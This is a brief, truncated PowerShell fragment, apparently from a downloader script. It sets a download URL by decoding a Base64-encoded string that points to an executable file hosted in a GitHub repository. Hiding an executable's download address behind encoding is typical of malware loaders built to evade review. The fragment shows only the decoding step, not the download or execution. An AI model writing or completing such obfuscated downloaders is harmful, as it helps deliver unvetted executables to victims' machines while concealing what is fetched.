...
try {
    ...
    # O
    $download_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL1RoZU1vY2thLzcuNC9yYXcvcmVmcy9oZWFkcy9tYWluLzcuNHYuZXhl'))
